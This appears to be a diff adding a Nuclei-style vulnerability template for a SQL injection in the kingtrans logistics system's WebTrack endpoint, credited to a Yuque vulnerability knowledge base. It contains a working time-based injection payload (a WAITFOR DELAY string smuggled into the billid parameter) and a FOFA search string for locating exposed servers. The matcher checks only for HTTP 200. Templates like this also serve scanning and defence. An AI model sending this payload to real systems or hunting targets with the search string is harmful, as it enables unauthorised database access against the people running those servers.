@@ -1,0 +1,23 @@
+id: poc-umevhrl0obcsztga
+info:
+  name: kingtrans物流管理系统WebTrack 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/umevhrl0obcsztga'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: umevhrl0obcsztga
+    fofa: body="www.kingtrans.net"
+http:
+- raw:
+  - 'GET /WebTrack?action=getAccountTypeByNumber&billid=%27;%20WAITFOR%20DELAY%20%270:0:3%27--%20- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.1943.105 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
